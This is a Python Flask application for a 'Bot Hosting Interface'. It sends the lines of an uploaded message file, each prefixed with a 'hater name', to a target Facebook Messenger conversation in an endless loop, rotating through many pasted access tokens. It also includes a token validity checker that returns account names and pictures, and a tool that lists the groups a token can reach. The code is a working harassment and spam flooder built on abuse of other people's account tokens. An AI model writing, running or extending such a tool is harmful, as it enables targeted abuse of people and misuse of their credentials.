from flask import Flask, render_template_string, request, redirect, url_for, jsonify
import requests
import json
import time
import os
import threading
from datetime import datetime
import uuid

app = Flask(__name__)

# Global variables
active_tasks = {}
logs = {}
html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Hosting Interface</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f4f4f4;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 1000px;
            margin: auto;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input[type="text"],
        input[type="number"],
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
            min-height: 100px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-bottom: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .button-danger {
            background-color: #dc3545;
        }
        .button-danger:hover {
            background-color: #c82333;
        }
        .button-success {
            background-color: #28a745;
        }
        .button-success:hover {
            background-color: #218838;
        }
        .button-info {
            background-color: #17a2b8;
        }
        .button-info:hover {
            background-color: #138496;
        }
        .tabs {
            display: flex;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            background-color: #f1f1f1;
            border: 1px solid #ddd;
            border-bottom: none;
            border-radius: 5px 5px 0 0;
            margin-right: 5px;
            margin-bottom: 5px;
        }
        .tab.active {
            background-color: #fff;
            font-weight: bold;
        }
        .tab-content {
            display: none;
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 0 0 5px 5px;
        }
        .tab-content.active {
            display: block;
        }
        .log-container {
            height: 300px;
            overflow-y: auto;
            border: 1px solid #ddd;
            padding: 10px;
            margin-bottom: 15px;
            background-color: #f8f9fa;
            font-family: monospace;
            font-size: 12px;
        }
        .token-result {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .group-result {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: #e9ecef;
        }
        .token-valid {
            background-color: #d4edda;
            border-color: #c3e6cb;
        }
        .token-invalid {
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
        .task-item {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 10px;
            background-color: #f8f9fa;
        }
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .task-title {
            font-weight: bold;
        }
        .task-status {
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
        }
        .status-running {
            background-color: #d4edda;
            color: #155724;
        }
        .status-stopped {
            background-color: #f8d7da;
            color: #721c24;
        }
        .group-list {
            max-height: 300px;
            overflow-y: auto;
            margin-top: 10px;
        }
        .group-item {
            padding: 8px;
            border-bottom: 1px solid #ddd;
        }
        .group-item:last-child {
            border-bottom: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bot Hosting Interface</h1>
        
        <div class="tabs">
            <div class="tab active" onclick="switchTab('bot-tab')">Bot Control</div>
            <div class="tab" onclick="switchTab('token-tab')">Token Checker</div>
            <div class="tab" onclick="switchTab('groups-tab')">Group Fetcher</div>
            <div class="tab" onclick="switchTab('logs-tab')">View Logs</div>
        </div>
        
        <div id="bot-tab" class="tab-content active">
            <form action="/run_bot" method="post" enctype="multipart/form-data">
                <label for="convo_uid">Convo UID:</label>
                <input type="text" id="convo_uid" name="convo_uid" required>

                <label for="token">Token (one per line):</label>
                <textarea id="token" name="token" required></textarea>

                <label for="message_file">Message File (one message per line):</label>
                <input type="file" id="message_file" name="message_file" accept=".txt" required>

                <label for="speed">Speed (seconds per message):</label>
                <input type="number" id="speed" name="speed" value="1" min="0" step="1" required>

                <label for="haters_name">Hater Name:</label>
                <input type="text" id="haters_name" name="haters_name" required>

                <button type="submit" class="button-success">Run Bot</button>
            </form>
        </div>
        
        <div id="token-tab" class="tab-content">
            <label for="check_tokens">Tokens to Check (one per line):</label>
            <textarea id="check_tokens" name="check_tokens"></textarea>
            <button onclick="checkTokens()" class="button-success">Check Tokens</button>
            <div id="token-results"></div>
        </div>
        
        <div id="groups-tab" class="tab-content">
            <label for="group_token">Token:</label>
            <input type="text" id="group_token" name="group_token">
            
            <button onclick="fetchGroups()" class="button-info">Fetch Messenger Groups</button>
            
            <div id="group-results"></div>
        </div>
        
        <div id="logs-tab" class="tab-content">
            <h3>Active Tasks</h3>
            <div id="active-tasks">
                {% for task_id, task in active_tasks.items() %}
                <div class="task-item">
                    <div class="task-header">
                        <div class="task-title">Task: {{ task.type }} - {{ task.name }}</div>
                        <div class="task-status status-running">Running</div>
                    </div>
                    <div class="log-container" id="log-container-{{ task_id }}">
                        {% for log in task.logs %}
                        <div>{{ log }}</div>
                        {% endfor %}
                    </div>
                    <button onclick="stopTask('{{ task_id }}')" class="button-danger">Stop This Task</button>
                </div>
                {% endfor %}
            </div>
            
            <h3>All Logs</h3>
            <div class="log-container" id="all-logs-container">
                {% for log in all_logs %}
                <div>{{ log }}</div>
                {% endfor %}
            </div>
            <button onclick="refreshLogs()">Refresh Logs</button>
            <button onclick="clearLogs()" class="button-danger">Clear All Logs</button>
        </div>
    </div>

    <script>
        function switchTab(tabId) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab content
            document.getElementById(tabId).classList.add('active');
            
            // Update active tab
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            // If switching to logs tab, refresh logs
            if (tabId === 'logs-tab') {
                refreshLogs();
            }
        }
        
        function checkTokens() {
            const tokens = document.getElementById('check_tokens').value.split('\\n');
            const resultsContainer = document.getElementById('token-results');
            resultsContainer.innerHTML = '<div>Checking tokens...</div>';
            
            fetch('/check_tokens', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({tokens: tokens}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                data.results.forEach(result => {
                    const div = document.createElement('div');
                    div.className = result.valid ? 'token-result token-valid' : 'token-result token-invalid';
                    div.innerHTML = `<strong>${result.token}</strong>: ${result.message}`;
                    if (result.valid && result.name) {
                        div.innerHTML += `<br>Name: ${result.name}`;
                    }
                    if (result.valid && result.picture) {
                        div.innerHTML += `<br><img src="${result.picture}" width="50" height="50">`;
                    }
                    resultsContainer.appendChild(div);
                });
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div>Error checking tokens</div>';
            });
        }
        
        function fetchGroups() {
            const token = document.getElementById('group_token').value;
            const resultsContainer = document.getElementById('group-results');
            resultsContainer.innerHTML = '<div>Fetching groups...</div>';
            
            fetch('/fetch_groups', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({token: token}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                if (data.error) {
                    resultsContainer.innerHTML = `<div class="token-result token-invalid">Error: ${data.error}</div>`;
                    return;
                }
                
                if (data.groups.length === 0) {
                    resultsContainer.innerHTML = '<div class="token-result">No groups found</div>';
                    return;
                }
                
                data.groups.forEach(group => {
                    const div = document.createElement('div');
                    div.className = 'group-result';
                    div.innerHTML = `
                        <strong>${group.name}</strong><br>
                        <small>ID: ${group.id}</small><br>
                        <small>Link: <a href="https://facebook.com/messages/t/${group.id}" target="_blank">https://facebook.com/messages/t/${group.id}</a></small>
                    `;
                    resultsContainer.appendChild(div);
                });
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="token-result token-invalid">Error fetching groups</div>';
            });
        }
        
        function refreshLogs() {
            fetch('/get_logs')
            .then(response => response.json())
            .then(data => {
                // Update active tasks
                const activeTasksContainer = document.getElementById('active-tasks');
                activeTasksContainer.innerHTML = '';
                
                for (const [taskId, task] of Object.entries(data.active_tasks)) {
                    const taskDiv = document.createElement('div');
                    taskDiv.className = 'task-item';
                    taskDiv.innerHTML = `
                        <div class="task-header">
                            <div class="task-title">Task: ${task.type} - ${task.name}</div>
                            <div class="task-status status-running">Running</div>
                        </div>
                        <div class="log-container" id="log-container-${taskId}">
                            ${task.logs.map(log => `<div>${log}</div>`).join('')}
                        </div>
                        <button onclick="stopTask('${taskId}')" class="button-danger">Stop This Task</button>
                    `;
                    activeTasksContainer.appendChild(taskDiv);
                }
                
                // Update all logs
                const allLogsContainer = document.getElementById('all-logs-container');
                allLogsContainer.innerHTML = '';
                data.all_logs.forEach(log => {
                    const div = document.createElement('div');
                    div.textContent = log;
                    allLogsContainer.appendChild(div);
                });
                allLogsContainer.scrollTop = allLogsContainer.scrollHeight;
            });
        }
        
        function stopTask(taskId) {
            fetch('/stop_task', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({task_id: taskId}),
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    refreshLogs();
                }
            });
        }
        
        function clearLogs() {
            fetch('/clear_logs', {method: 'POST'})
            .then(() => refreshLogs());
        }
        
        // Auto-refresh logs if on logs tab
        setInterval(() => {
            if (document.getElementById('logs-tab').classList.contains('active')) {
                refreshLogs();
            }
        }, 3000);
    </script>
</body>
</html>
'''

def add_log(task_id, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    if task_id not in logs:
        logs[task_id] = []
    
    logs[task_id].append(log_entry)
    
    # Keep only the last 100 logs per task to prevent memory issues
    if len(logs[task_id]) > 100:
        logs[task_id] = logs[task_id][-100:]

def check_token_validity(token):
    """Check if a Facebook token is valid and return user info"""
    try:
        # First, check if token is valid
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}"
        response = requests.get(url)
        
        if response.status_code == 200:
            user_data = response.json()
            user_id = user_data.get('id')
            
            # Get profile picture
            picture_url = f"https://graph.facebook.com/v17.0/{user_id}/picture?access_token={token}&redirect=false"
            picture_response = requests.get(picture_url)
            picture_data = picture_response.json()
            picture = picture_data.get('data', {}).get('url') if picture_response.status_code == 200 else None
            
            # Get user name
            name_url = f"https://graph.facebook.com/v17.0/{user_id}?fields=name&access_token={token}"
            name_response = requests.get(name_url)
            name_data = name_response.json()
            name = name_data.get('name') if name_response.status_code == 200 else "Unknown"
            
            return {
                'valid': True,
                'message': 'Valid token',
                'name': name,
                'picture': picture
            }
        else:
            return {
                'valid': False,
                'message': f'Invalid token: {response.json().get("error", {}).get("message", "Unknown error")}',
                'name': None,
                'picture': None
            }
    except Exception as e:
        return {
            'valid': False,
            'message': f'Error checking token: {str(e)}',
            'name': None,
            'picture': None
        }

def fetch_messenger_groups(token):
    """Fetch Messenger groups for a given token"""
    try:
        url = f"https://graph.facebook.com/v17.0/me/groups?access_token={token}&limit=100"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            groups = []
            
            for group in data.get('data', []):
                groups.append({
                    'id': group.get('id'),
                    'name': group.get('name', 'Unknown Group')
                })
            
            return {'success': True, 'groups': groups}
        else:
            return {'success': False, 'error': response.json().get('error', {}).get('message', 'Unknown error')}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_name):
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    messages = message_content.splitlines()
    tokens = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Starting bot with {num_messages} messages and {num_tokens} tokens")
    
    while task_id in active_tasks and active_tasks[task_id]['running']:
        try:
            for message_index in range(num_messages):
                if task_id not in active_tasks or not active_tasks[task_id]['running']:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_uid}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    log_msg = f"[+] Message {message_index + 1} of Convo {convo_uid} Token {token_index + 1}: {haters_name} {message} - Sent at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    log_msg = f"[x] Failed to send Message {message_index + 1} of Convo {convo_uid} with Token {token_index + 1}: {haters_name} {message} - Error: {response.text} - At {current_time}"
                    add_log(task_id, log_msg)
                time.sleep(speed)

            if task_id not in active_tasks or not active_tasks[task_id]['running']:
                break
                
            add_log(task_id, "[+] All messages sent. Restarting the process...")
        except Exception as e:
            error_msg = f"[!] An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5) # Wait before retrying on error
    
    if task_id in active_tasks:
        active_tasks[task_id]['running'] = False
    add_log(task_id, "Bot execution completed")

@app.route('/')
def index():
    all_logs = []
    for task_logs in logs.values():
        all_logs.extend(task_logs[-20:])
    
    return render_template_string(html_content, 
                                active_tasks=active_tasks, 
                                all_logs=all_logs[-100:] if all_logs else [])

@app.route('/run_bot', methods=['POST'])
def run_bot():
    convo_uid = request.form['convo_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Generate a unique task ID
    task_id = str(uuid.uuid4())
    
    # Create task entry
    active_tasks[task_id] = {
        'type': 'Message Bot',
        'name': f'Convo {convo_uid}',
        'running': True,
        'logs': []
    }
    
    # Start the bot in a separate thread
    thread = threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name))
    thread.daemon = True
    thread.start()

    add_log(task_id, "Bot started successfully")
    return redirect(url_for('index'))

@app.route('/stop_task', methods=['POST'])
def stop_task():
    data = request.json
    task_id = data.get('task_id')
    
    if task_id in active_tasks:
        active_tasks[task_id]['running'] = False
        add_log(task_id, "Stop command received")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/check_tokens', methods=['POST'])
def check_tokens():
    data = request.json
    tokens = data.get('tokens', [])
    
    results = []
    for token in tokens:
        if token.strip():  # Only check non-empty tokens
            result = check_token_validity(token.strip())
            result['token'] = token.strip()  # Add the token to the result
            results.append(result)
    
    return jsonify({'results': results})

@app.route('/fetch_groups', methods=['POST'])
def fetch_groups():
    data = request.json
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'error': 'No token provided'})
    
    result = fetch_messenger_groups(token)
    
    if result['success']:
        return jsonify({'groups': result['groups']})
    else:
        return jsonify({'error': result['error']})

@app.route('/get_logs')
def get_logs():
    # Prepare logs for all active tasks
    task_logs = {}
    for task_id, task_info in active_tasks.items():
        if task_id in logs:
            task_logs[task_id] = {
                'type': task_info['type'],
                'name': task_info['name'],
                'logs': logs[task_id]
            }
    
    # Prepare all logs
    all_logs_list = []
    for task_log in logs.values():
        all_logs_list.extend(task_log)
    
    return jsonify({
        'active_tasks': task_logs,
        'all_logs': all_logs_list[-100:] if all_logs_list else []
    })

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    global logs
    logs = {}
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
